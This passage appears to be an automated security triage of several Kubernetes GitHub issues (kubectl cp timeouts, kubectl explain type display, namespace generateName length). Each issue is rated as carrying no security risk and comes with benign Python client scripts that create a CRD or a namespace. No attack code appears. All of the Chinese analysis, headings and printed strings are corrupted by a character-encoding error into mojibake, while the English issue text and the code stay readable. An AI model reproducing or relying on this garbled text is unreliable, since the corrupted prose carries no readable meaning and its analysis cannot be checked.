# å¹¶ä¸”è¡¨ç°ä¸ºé—´æ­‡æ€§è¶…æ—¶ï¼Œéš¾ä»¥é€šè¿‡ç®€å•çš„è„šæœ¬ç¨³å®šå¤ç°ã€‚
# å¦‚æœéœ€è¦è°ƒè¯•è¯¥åŠŸèƒ½é—®é¢˜ï¼Œåº”éµå¾ª Issue ä¸­æåˆ°çš„ç¯å¢ƒè®¾ç½®å°è¯•å¤ç°ã€‚

print("è¯¥ Issue è¢«åˆ¤å®šä¸ºåŠŸèƒ½æ€§é—®é¢˜ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ— éœ€ç”Ÿæˆ POC è„šæœ¬ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æè¿°äº† `kubectl cp` å‘½ä»¤åœ¨ç‰¹å®šç‰ˆæœ¬ï¼ˆv1.32.xï¼‰å’Œè·¨ EKS é›†ç¾¤ç¯å¢ƒä¸‹é—´æ­‡æ€§å¤±è´¥å¹¶è¶…æ—¶çš„ç°è±¡ã€‚åˆ†æè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§çš„ Bug æˆ–ç½‘ç»œ/åè®®å±‚é¢çš„å…¼å®¹æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚å…·ä½“åŸå› å¯èƒ½ä¸ v1.32 å¼•å…¥çš„ exec åè®®å˜æ›´ã€Websocket çš„ keep-alive æœºåˆ¶ï¼ˆæ—¥å¿—ä¸­å‡ºç°çš„ Ping/Pongï¼‰æˆ–è·¨é›†ç¾¤ç½‘ç»œç¯å¢ƒä¸‹çš„å»¶è¿Ÿ/ä¸¢åŒ…æœ‰å…³ã€‚

ç”±äºè¯¥é—®é¢˜ï¼š
1.  ä¸æ¶‰åŠæœªæˆæƒè®¿é—®ã€æ•°æ®æ³„éœ²ã€æƒé™æå‡æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
2.  è™½ç„¶å½±å“äº† `kubectl cp` çš„å¯ç”¨æ€§ï¼Œä½†è¿™æ˜¯ä¸€ç§åŠŸèƒ½ä¸­æ–­ï¼Œä¸”éœ€è¦ç”¨æˆ·æœ¬èº«å…·å¤‡æ‰§è¡Œè¯¥å‘½ä»¤çš„æƒé™ã€‚æ ¹æ®åˆ¤å®šæ ‡å‡†ï¼Œè¿™ç§éœ€è¦æƒé™æ‰èƒ½è§¦å‘ä¸”å½±å“è‡ªèº«çš„ DoS ä¸è¢«è§†ä¸ºé«˜é£é™©å®‰å…¨é—®é¢˜ã€‚
3.  æ²¡æœ‰è¯æ®è¡¨æ˜ä¸€ä¸ªç”¨æˆ·è§¦å‘æ­¤é—®é¢˜ä¼šå½±å“å…¶ä»–ç”¨æˆ·ã€‚
4.  Issue å†…å®¹å’Œæ—¥å¿—æœªæš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ Issue è¢«è¯„å®šä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ï¼Œæ— éœ€æä¾›ç”¨äºå¤ç°å®‰å…¨æ¼æ´çš„ POC è„šæœ¬ã€‚æä¾›çš„ Python ä»£ç ç‰‡æ®µä»…ç”¨äºè¯´æ˜æ— éœ€ç”Ÿæˆ POCã€‚

---


## Issue #130946 Int-or-String fields are presented as Object in kubectl explain

- Issue é“¾æ¥ï¼š[#130946](https://github.com/kubernetes/kubernetes/issues/130946)

### Issue å†…å®¹

#### What happened?

I created a CRD that has a map of int-or-string fields. When I `kubectl explain` that field, its type is presented as `<map[string]Object>`.

#### What did you expect to happen?

I'm not certain what I expect it to present, but acceptable values are not shaped like JSON objects.

#### How can we reproduce it (as minimally and precisely as possible)?

This CRD has a single field in its spec. Create or Apply this CRD, then run `kubectl explain` on it.

```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: maps.example.com
spec:
  group: example.com
  names:
    kind: Map
    listKind: MapList
    plural: maps
    singular: map
  scope: Namespaced
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          apiVersion:
            type: string
          kind:
            type: string
          metadata:
            type: object
          spec:
            type: object
            properties:
              options:
                type: object
                x-kubernetes-map-type: atomic
                maxProperties: 20
                additionalProperties:
                  anyOf:
                  - type: integer
                  - type: string
                  x-kubernetes-int-or-string: true
```

```console
$ kubectl explain Maps.spec
GROUP:      example.com
KIND:       Map
VERSION:    v1

FIELD: spec <Object>


DESCRIPTION:
    <empty>
FIELDS:
  options	<map[string]Object> ğŸ‘ˆ
    <no description>
```

```console
$ kubectl explain Maps.spec.options
GROUP:      example.com
KIND:       Map
VERSION:    v1

FIELD: options <map[string]Object> ğŸ‘ˆ


DESCRIPTION:
    <empty>
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.0
Kustomize Version: v5.5.0
Server Version: v1.32.1+k3s1
```

</details>


#### Cloud provider

n/a

#### OS version

`kubectl` on macOS


#### Install tools

<details>
Rancher Desktop
</details>


#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†åœ¨ä½¿ç”¨ `kubectl explain` å‘½ä»¤æŸ¥è¯¢ä¸€ä¸ªåŒ…å« `int-or-string` ç±»å‹å­—æ®µçš„ Custom Resource Definition (CRD) æ—¶ï¼Œè¯¥å­—æ®µçš„ç±»å‹è¢«æ˜¾ç¤ºä¸º `<map[string]Object>` æˆ– `<Object>`ï¼Œè€Œä¸æ˜¯ç”¨æˆ·æœŸæœ›çš„æ›´ç²¾ç¡®çš„ç±»å‹è¡¨ç¤ºï¼ˆä¾‹å¦‚ï¼Œèƒ½æ˜ç¡®åæ˜ å…¶æ—¢å¯ä»¥æ˜¯æ•´æ•°ä¹Ÿå¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼‰ã€‚

é—®é¢˜æ ¸å¿ƒåœ¨äº `kubectl explain` å¦‚ä½•è§£é‡Šå’Œå‘ˆç° Kubernetes API æ‰©å±•ä¸­å®šä¹‰çš„ `x-kubernetes-int-or-string: true` ç»“åˆ `anyOf`ï¼ˆåŒ…å« integer å’Œ string ç±»å‹ï¼‰çš„ OpenAPI v3 schemaã€‚`kubectl explain` åœ¨é‡åˆ°è¿™ç§ç»“æ„æ—¶ï¼Œä¼¼ä¹å°†å…¶ç®€åŒ–æˆ–å›é€€åˆ°äº†æ›´é€šç”¨çš„ `Object` ç±»å‹è¿›è¡Œæ˜¾ç¤ºã€‚

è¿™æ˜¯ä¸€ä¸ªå…³äº `kubectl` å·¥å…·è¾“å‡ºä¿¡æ¯å‡†ç¡®æ€§çš„é—®é¢˜ï¼Œå½±å“çš„æ˜¯å¼€å‘è€…æˆ–ç®¡ç†å‘˜ä½¿ç”¨ `kubectl explain` ç†è§£ CRD ç»“æ„æ—¶çš„ä½“éªŒå’Œæ¸…æ™°åº¦ã€‚å®ƒå¹¶ä¸å½±å“ CRD çš„å®é™…åŠŸèƒ½ã€æ•°æ®éªŒè¯æˆ– API æœåŠ¡å™¨çš„è¡Œä¸ºã€‚API æœåŠ¡å™¨ä»ç„¶ä¼šæ ¹æ® CRD schema ä¸­å®šä¹‰çš„ `anyOf` å’Œ `x-kubernetes-int-or-string` è§„åˆ™æ­£ç¡®åœ°éªŒè¯å’Œå¤„ç†æ•´æ•°æˆ–å­—ç¬¦ä¸²ç±»å‹çš„å€¼ã€‚

è¯¥é—®é¢˜ä¸æ¶‰åŠï¼š
1.  æ•°æ®æ³„éœ²ï¼š`kubectl explain` åªæ˜¾ç¤º schema ä¿¡æ¯ï¼Œä¸æ˜¾ç¤ºå®ä¾‹æ•°æ®ã€‚
2.  æœªæˆæƒè®¿é—®æˆ–æƒé™æå‡ï¼šè¯¥é—®é¢˜ä¸è®¤è¯æˆæƒæ— å…³ã€‚
3.  æ‹’ç»æœåŠ¡ï¼š`kubectl explain` çš„æ˜¾ç¤ºé”™è¯¯ä¸ä¼šå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚
4.  å‘½ä»¤æ‰§è¡Œæˆ–ä»£ç æ³¨å…¥ï¼šè¿™çº¯ç²¹æ˜¯ä¸€ä¸ªç±»å‹ä¿¡æ¯å±•ç¤ºé—®é¢˜ã€‚
5.  æ•°æ®ç¯¡æ”¹ï¼šä¸å½±å“èµ„æºçš„åˆ›å»ºã€æ›´æ–°ã€åˆ é™¤æ“ä½œçš„æ­£ç¡®æ€§ã€‚

è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ `kubectl` å·¥å…·åœ¨è§£é‡Šå’Œå‘ˆç°ç‰¹å®š OpenAPI schema ç»“æ„æ—¶çš„ä¸€ä¸ªæ˜¾ç¤ºç¼ºé™·æˆ–å¾…æ”¹è¿›ä¹‹å¤„ï¼Œå±äºå¯ç”¨æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue æè¿°çš„æ˜¯ kubectl explain å‘½ä»¤çš„è¾“å‡ºæ˜¾ç¤ºé—®é¢˜ï¼Œ
# å¹¶éä¸€ä¸ªå¯ä»¥é€šè¿‡ä»£ç åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚
# kubectl explain æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å·¥å…·ï¼Œç”¨äºå±•ç¤º K8s èµ„æºçš„ Schema ä¿¡æ¯ï¼Œ
# å…¶è¾“å‡ºå†…å®¹çš„ç²¾ç¡®æ€§é—®é¢˜ä¸æ„æˆå®‰å…¨é£é™©ã€‚
# API Server ä¾§å¯¹ int-or-string ç±»å‹çš„å®é™…å¤„ç†ä¸å—æ­¤æ˜¾ç¤ºé—®é¢˜å½±å“ã€‚
# å› æ­¤ï¼Œæ— éœ€æä¾›å¤ç°å®‰å…¨é£é™©çš„ POC è„šæœ¬ã€‚

# ä¸‹é¢çš„ä»£ç æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ Python Kubernetes å®¢æˆ·ç«¯åº“åˆ›å»º CRDï¼Œ
# ä½†è¿™ä»…ç”¨äºè®¾ç½®ç¯å¢ƒï¼Œæ— æ³•â€œå¤ç°â€kubectl çš„æ˜¾ç¤ºé—®é¢˜ï¼Œå› ä¸ºè¯¥é—®é¢˜åœ¨äº kubectl å·¥å…·æœ¬èº«ã€‚

import kubernetes
import yaml
import time
import sys
from kubernetes import config, client, utils
from kubernetes.client import ApiClient, CustomObjectsApi, ApiextensionsV1Api
from kubernetes.client.rest import ApiException

CRD_YAML = """
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: maps.example.com
spec:
  group: example.com
  names:
    kind: Map
    listKind: MapList
    plural: maps
    singular: map
  scope: Namespaced
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          apiVersion:
            type: string
          kind:
            type: string
          metadata:
            type: object
          spec:
            type: object
            properties:
              options:
                type: object
                x-kubernetes-map-type: atomic
                maxProperties: 20
                additionalProperties:
                  anyOf:
                  - type: integer
                  - type: string
                  x-kubernetes-int-or-string: true
"""

def main():
    try:
        # å°è¯•ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        print("åŠ è½½ Kubernetes é…ç½®...")
        config.load_kube_config()
        print("é…ç½®åŠ è½½æˆåŠŸã€‚")

        # åˆ›å»º API å®¢æˆ·ç«¯
        api_client = ApiClient()
        apiextensions_v1_api = ApiextensionsV1Api(api_client)

        crd_name = "maps.example.com"

        # å°è¯•åˆ é™¤å·²å­˜åœ¨çš„ CRD (å¿½ç•¥é”™è¯¯)
        try:
            print(f"å°è¯•åˆ é™¤å¯èƒ½å·²å­˜åœ¨çš„ CRD: {crd_name}...")
            apiextensions_v1_api.delete_custom_resource_definition(crd_name)
            # ç­‰å¾… CRD å®Œå…¨åˆ é™¤
            print("ç­‰å¾… CRD åˆ é™¤...")
            time.sleep(5)
        except ApiException as e:
            if e.status == 404:
                print(f"CRD {crd_name} ä¸å­˜åœ¨ï¼Œæ— éœ€åˆ é™¤ã€‚")
            else:
                print(f"åˆ é™¤ CRD æ—¶å‘ç”Ÿé”™è¯¯ (å¿½ç•¥): {e}")
        except Exception as e:
             print(f"åˆ é™¤ CRD æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯ (å¿½ç•¥): {e}")


        # åˆ›å»º CRD
        print(f"åˆ›å»º CRD: {crd_name}...")
        crd_body = yaml.safe_load(CRD_YAML)
        try:
            apiextensions_v1_api.create_custom_resource_definition(body=crd_body)
            print(f"CRD {crd_name} åˆ›å»ºæˆåŠŸã€‚")
            # ç­‰å¾… CRD å»ºç«‹
            print("ç­‰å¾… CRD å»ºç«‹...")
            time.sleep(5)
        except ApiException as e:
            print(f"åˆ›å»º CRD æ—¶å‘ç”Ÿé”™è¯¯: {e}")
            sys.exit(1)
        except Exception as e:
            print(f"åˆ›å»º CRD æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
            sys.exit(1)

        print("\nCRD ç¯å¢ƒè®¾ç½®å®Œæˆã€‚")
        print("è¯·æ‰‹åŠ¨è¿è¡Œä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ kubectl explain çš„è¾“å‡º:")
        print(f"$ kubectl explain Maps.spec")
        print(f"$ kubectl explain Maps.spec.options")
        print("\né¢„æœŸä¼šçœ‹åˆ° 'options' å­—æ®µç±»å‹æ˜¾ç¤ºä¸º <map[string]Object> æˆ–ç±»ä¼¼å½¢å¼ï¼Œ")
        print("è¿™æ­£æ˜¯ Issue ä¸­æè¿°çš„é—®é¢˜ï¼Œä½†è¿™å¹¶éå®‰å…¨é£é™©ã€‚")

        # æ¸…ç† CRD (å¯é€‰)
        # try:
        #     print(f"\næ¸…ç†: åˆ é™¤ CRD {crd_name}...")
        #     apiextensions_v1_api.delete_custom_resource_definition(crd_name)
        #     print(f"CRD {crd_name} å·²åˆ é™¤ã€‚")
        # except ApiException as e:
        #     print(f"åˆ é™¤ CRD æ—¶å‘ç”Ÿé”™è¯¯: {e}")
        # except Exception as e:
        #     print(f"åˆ é™¤ CRD æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")

    except config.ConfigException as e:
        print(f"æ— æ³•åŠ è½½ Kubernetes é…ç½®: {e}")
        print("è¯·ç¡®ä¿ KUBECONFIG ç¯å¢ƒå˜é‡å·²è®¾ç½®æˆ–é…ç½®æ–‡ä»¶ä½äºé»˜è®¤ä½ç½® (~/.kube/config)ã€‚")
        sys.exit(1)
    except Exception as e:
        print(f"æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
        sys.exit(1)

# ç›´æ¥æ‰§è¡Œ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯ `kubectl explain` å‘½ä»¤åœ¨å±•ç¤ºåŒ…å« `int-or-string` ç±»å‹çš„ CRD å­—æ®µæ—¶ï¼Œè¾“å‡ºçš„ç±»å‹ä¿¡æ¯ä¸å¤Ÿç²¾ç¡®ï¼ˆæ˜¾ç¤ºä¸º Objectï¼‰ï¼Œè¿™å¯èƒ½å¯¹ç”¨æˆ·ç†è§£å­—æ®µé¢„æœŸç±»å‹é€ æˆå›°æ‰°ã€‚ç„¶è€Œï¼Œè¿™ä»…ä»…æ˜¯å®¢æˆ·ç«¯å·¥å…· `kubectl` çš„æ˜¾ç¤ºé—®é¢˜ï¼Œå¹¶ä¸å½±å“ Kubernetes API Server å¯¹è¯¥ CRD å®ä¾‹çš„å®é™…éªŒè¯é€»è¾‘ï¼ˆå®ƒä»ç„¶ä¼šæ­£ç¡®æ¥å—æ•´æ•°æˆ–å­—ç¬¦ä¸²ï¼‰ã€‚è¯¥é—®é¢˜ä¸æ¶‰åŠä»»ä½•å®‰å…¨æœºåˆ¶çš„ç»•è¿‡ã€æ•°æ®æ³„éœ²ã€æƒé™æå‡æˆ–æœåŠ¡ä¸­æ–­ç­‰é£é™©ï¼Œå› æ­¤ä¸æ„æˆå®‰å…¨æ¼æ´ã€‚

ç”±äºé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼ŒæŒ‰ç…§è¦æ±‚ä¸éœ€è¦æä¾›ç”¨äºå¤ç°å®‰å…¨é£é™©çš„ POC è„šæœ¬ã€‚ä¸Šé¢æä¾›çš„ Python è„šæœ¬ä»…ç”¨äºæ¼”ç¤ºå¦‚ä½•é€šè¿‡ Kubernetes Python å®¢æˆ·ç«¯åº“åˆ›å»º Issue ä¸­æè¿°çš„ CRDã€‚è„šæœ¬æ‰§è¡Œåï¼Œç”¨æˆ·éœ€è¦æ‰‹åŠ¨è¿è¡Œ `kubectl explain Maps.spec` å’Œ `kubectl explain Maps.spec.options` å‘½ä»¤æ¥è§‚å¯Ÿ Issue ä¸­æè¿°çš„ `kubectl` è¾“å‡ºè¡Œä¸ºã€‚è¿™ä¸ªè„šæœ¬æœ¬èº«å¹¶ä¸èƒ½â€œå¤ç°â€`kubectl` çš„æ˜¾ç¤ºé—®é¢˜ï¼Œå› ä¸ºå®ƒå…³æ³¨çš„æ˜¯ CRD çš„åˆ›å»ºè€Œé `kubectl` çš„å†…éƒ¨é€»è¾‘ã€‚è„šæœ¬åŠ è½½æœ¬åœ° kubeconfig é…ç½®ï¼Œè¿æ¥åˆ° Kubernetes é›†ç¾¤ï¼Œåˆ›å»º CRDï¼Œå¹¶æç¤ºç”¨æˆ·åç»­ä½¿ç”¨ `kubectl` è¿›è¡Œè§‚å¯Ÿã€‚è„šæœ¬ä¸­åŒ…å«äº†åŸºæœ¬çš„é”™è¯¯å¤„ç†å’Œèµ„æºæ¸…ç†ï¼ˆæ³¨é‡Šæ‰ï¼‰çš„é€»è¾‘ã€‚

---


## Issue #130903 Namespace with metadata.generateName value longer than 63 characters fails to create

- Issue é“¾æ¥ï¼š[#130903](https://github.com/kubernetes/kubernetes/issues/130903)

### Issue å†…å®¹

#### What happened?

Kubernetes fails to create a namespace object if the namespace's `metadata.generateName` field has a value that is > 63 characters. Even though `GenerateName` logic in Kubernetes truncates the provided value to create a unique name.






#### What did you expect to happen?

The namespace object to be created truncated to a valid length with randomized suffix.

#### How can we reproduce it (as minimally and precisely as possible)?

Reproduction with Kubernetes (both EKS and via minikube) Using Kubernetes 1.29 and 1.31.

namespace defined in yaml file.
```yaml
apiVersion: v1
kind: Namespace
metadata:
  generateName: a-long-name-012345678901234567890123456789012345678901234567890123456789-
```

> kubectl create -f namespace-too-log-test.yaml

Result:
> The Namespace "a-long-name-0123456789012345678901234567890123456789012345s7vj4" is invalid: metadata.generateName: Invalid value: "a-long-name-012345678901234567890123456789012345678901234567890123456789-": must be no more than 63 characters

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.29.12
WARNING: version difference between client (1.32) and server (1.29) exceeds the supported minor version skew of +/-1

```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.0 v0.8 (Cubic 2024-09-27 16:57)"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"

$ uname -a
Linux jasdel-5480-ubuntu 6.8.0-52-generic #53~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Jan 15 19:18:46 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **é—®é¢˜æè¿°**: Issue æŒ‡å‡ºï¼Œå½“ä½¿ç”¨ `metadata.generateName` å­—æ®µåˆ›å»º Kubernetes Namespace æ—¶ï¼Œå¦‚æœè¯¥å­—æ®µçš„å€¼è¶…è¿‡ 63 ä¸ªå­—ç¬¦ï¼Œå³ä½¿ Kubernetes çš„ `GenerateName` é€»è¾‘æœ¬åº”æˆªæ–­è¯¥å€¼å¹¶é™„åŠ éšæœºåç¼€ä»¥ç”Ÿæˆæœ‰æ•ˆåç§°ï¼Œåˆ›å»ºæ“ä½œä¹Ÿä¼šå¤±è´¥ã€‚API Server è¿”å›é”™è¯¯ï¼Œæ˜ç¡®æŒ‡å‡º `metadata.generateName` å­—æ®µæœ¬èº«çš„å€¼ä¸èƒ½è¶…è¿‡ 63 ä¸ªå­—ç¬¦ã€‚
2.  **å¤ç°æ­¥éª¤**: æä¾›äº†åŒ…å«è¶…é•¿ `generateName` çš„ Namespace YAML å®šä¹‰ï¼Œå¹¶é€šè¿‡ `kubectl create` å‘½ä»¤å¤ç°äº†é”™è¯¯ã€‚é”™è¯¯ä¿¡æ¯ `Invalid value: "...": must be no more than 63 characters` ç¡®è®¤äº† API Server åœ¨å¤„ç†è¯·æ±‚æ—¶å¯¹ `generateName` å­—æ®µè¿›è¡Œäº†é•¿åº¦æ ¡éªŒã€‚
3.  **é¢„æœŸè¡Œä¸º**: ç”¨æˆ·æœŸæœ›å³ä½¿ `generateName` å‰ç¼€è¿‡é•¿ï¼ŒKubernetes ä¹Ÿèƒ½è‡ªåŠ¨æˆªæ–­å®ƒï¼Œå¹¶æˆåŠŸåˆ›å»ºå…·æœ‰æœ‰æ•ˆé•¿åº¦åç§°çš„ Namespaceã€‚
4.  **å®‰å…¨é£é™©åˆ†æ**:
    *   è¯¥é—®é¢˜æ˜¯ Kubernetes API Server å¯¹è¾“å…¥å­—æ®µ `metadata.generateName` çš„éªŒè¯é€»è¾‘ä¸ç”¨æˆ·ï¼ˆæˆ–æŸäº›åœºæ™¯ä¸‹çš„é¢„æœŸï¼‰ä¸ç¬¦ã€‚API Server æ‹’ç»äº†å®ƒè®¤ä¸ºæ˜¯æ— æ•ˆçš„è¾“å…¥ï¼ˆå­—æ®µå€¼æœ¬èº«è¶…é•¿ï¼‰ã€‚
    *   è¿™å¹¶æœªå¼•å…¥ä»£ç æ‰§è¡Œã€æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²æˆ–å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©æ¼æ´ã€‚
    *   æ˜¯å¦æ„æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Ÿæ”»å‡»è€…å¦‚æœæ‹¥æœ‰åˆ›å»º Namespace çš„æƒé™ï¼Œå¯ä»¥é€šè¿‡å‘é€å¤§é‡æ­¤ç±»æ— æ•ˆè¯·æ±‚æ¥è½»å¾®å¢åŠ  API Server çš„è´Ÿè½½ï¼ˆå¤„ç†å’Œæ‹’ç»è¯·æ±‚ï¼‰ã€‚ç„¶è€Œï¼š
        *   æ”»å‡»è€…éœ€è¦å…·å¤‡ `create namespace` æƒé™ï¼Œè¿™é€šå¸¸æ˜¯è¾ƒé«˜æƒé™ï¼ˆæ»¡è¶³è§„åˆ™ 5 çš„é™çº§æ¡ä»¶ï¼‰ã€‚
        *   å½±å“éå¸¸æœ‰é™ï¼Œä»…é˜»æ­¢äº†ç‰¹å®šï¼ˆæ— æ•ˆï¼‰èµ„æºçš„åˆ›å»ºï¼Œä¸ä¼šå¯¼è‡´ API Server å´©æºƒæˆ–å½±å“å…¶ä»–åˆæ³•æ“ä½œçš„å¤„ç†ã€‚è¿™ç§å½±å“ç¨‹åº¦ä¸è¶³ä»¥æ„æˆå…¸å‹çš„ DoS æ”»å‡»ã€‚
        *   ç³»ç»Ÿè¡Œä¸ºæ˜¯æ˜ç¡®æ‹’ç»æ— æ•ˆè¾“å…¥ï¼Œè¿™æ˜¯ä¸€ç§å¥å£®æ€§è¡¨ç°ï¼Œè€Œéæ¼æ´ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆè§„åˆ™ 4ã€6ï¼‰ã€‚
    *   ä¸ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€ææƒç­‰ï¼ˆè§„åˆ™ 7ï¼‰ã€‚
    *   ä¸æ¶‰åŠä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆè§„åˆ™ 8ï¼‰ã€‚
    *   é—®é¢˜æè¿°æ¸…æ™°ï¼Œä¿¡æ¯å……åˆ†ï¼ˆè§„åˆ™ 9ï¼‰ã€‚

5.  **ç»“è®º**: è¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜æˆ– API è¡Œä¸ºä¸é¢„æœŸä¸ç¬¦çš„é—®é¢˜ï¼Œå³ API Server å¯¹ `generateName` å­—æ®µæœ¬èº«æ‰§è¡Œäº†é•¿åº¦æ ¡éªŒï¼Œè€Œä¸æ˜¯ä»…æ ¡éªŒæœ€ç»ˆç”Ÿæˆçš„åç§°ã€‚è¿™ä¸æ„æˆå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import sys
import time
from kubernetes import client, config
from kubernetes.client.exceptions import ApiException

def main():
    """
    å°è¯•ä½¿ç”¨è¶…é•¿çš„ generateName åˆ›å»º Namespaceï¼Œé¢„æœŸä¼šå¤±è´¥ã€‚
    """
    # å‡è®¾ kubeconfig æ–‡ä»¶ä½äºé»˜è®¤ä½ç½® (~/.kube/config)
    try:
        config.load_kube_config()
        print("ä½¿ç”¨é»˜è®¤ kubeconfig è¿›è¡Œè®¤è¯ã€‚")
    except Exception as e:
        print(f"æ— æ³•åŠ è½½ kubeconfig: {e}", file=sys.stderr)
        print("è¯·ç¡®ä¿ kubeconfig æ–‡ä»¶å­˜åœ¨ä¸”é…ç½®æ­£ç¡®ã€‚", file=sys.stderr)
        sys.exit(1)

    # åˆ›å»º CoreV1Api å®¢æˆ·ç«¯
    api_instance = client.CoreV1Api()

    # å®šä¹‰ä¸€ä¸ªè¶…é•¿çš„ generateName
    # é•¿åº¦å¤§äº 63 ä¸ªå­—ç¬¦
    long_generate_name = "a-very-long-namespace-name-that-is-designed-to-exceed-the-sixty-three-character-limit-"

    if len(long_generate_name) <= 63:
        print(f"é”™è¯¯ï¼šæä¾›çš„ generateName '{long_generate_name}' é•¿åº¦æœªè¶…è¿‡63å­—ç¬¦ï¼Œè¯·ä¿®æ”¹è„šæœ¬ã€‚", file=sys.stderr)
        sys.exit(1)

    print(f"å°è¯•ä½¿ç”¨ generateName (é•¿åº¦ {len(long_generate_name)}) åˆ›å»º Namespace: '{long_generate_name}'")

    # å®šä¹‰ Namespace å¯¹è±¡
    namespace_body = client.V1Namespace(
        metadata=client.V1ObjectMeta(generate_name=long_generate_name)
    )

    start_time = time.time()
    request_timeout_seconds = 120 # è®¾ç½®è¯·æ±‚è¶…æ—¶æ—¶é—´ä¸º 2 åˆ†é’Ÿ

    try:
        # å°è¯•åˆ›å»º Namespace
        # è®¾ç½®è¯·æ±‚è¶…æ—¶
        api_response = api_instance.create_namespace(
            body=namespace_body,
            _request_timeout=request_timeout_seconds
        )
        # å¦‚æœæˆåŠŸäº†ï¼ˆä¸ç¬¦åˆé¢„æœŸï¼‰
        print("æ„å¤–ï¼šNamespace åˆ›å»ºæˆåŠŸï¼")
        print(f"ç”Ÿæˆçš„ Namespace åç§°: {api_response.metadata.name}")
        # å¦‚æœæ„å¤–æˆåŠŸï¼Œå°è¯•åˆ é™¤å®ƒ
        try:
            print(f"å°è¯•åˆ é™¤æ„å¤–åˆ›å»ºçš„ Namespace: {api_response.metadata.name}")
            api_instance.delete_namespace(name=api_response.metadata.name)
            print("Namespace å·²åˆ é™¤ã€‚")
        except ApiException as delete_e:
            print(f"åˆ é™¤ Namespace æ—¶å‡ºé”™: {delete_e}", file=sys.stderr)
        except Exception as generic_delete_e:
             print(f"åˆ é™¤ Namespace æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {generic_delete_e}", file=sys.stderr)

    except ApiException as e:
        # é¢„æœŸä¼šè¿›å…¥è¿™é‡Œï¼Œæ•è· API å¼‚å¸¸
        elapsed_time = time.time() - start_time
        print(f"\né¢„æœŸå†…çš„å¤±è´¥ï¼šNamespace åˆ›å»ºå¤±è´¥ (è€—æ—¶ {elapsed_time:.2f} ç§’)ã€‚")
        print(f"API è¿”å›çŠ¶æ€ç : {e.status}")
        print(f"åŸå› : {e.reason}")
        # æ‰“å°éƒ¨åˆ†å“åº”ä½“ä»¥ç¡®è®¤é”™è¯¯ä¿¡æ¯
        if e.body:
             # å°è¯•è§£ç  body (é€šå¸¸æ˜¯ JSON å­—ç¬¦ä¸²)
            try:
                import json
                error_details = json.loads(e.body)
                print(f"é”™è¯¯è¯¦æƒ… (æ¥è‡ª API Server): {json.dumps(error_details, indent=2, ensure_ascii=False)}")
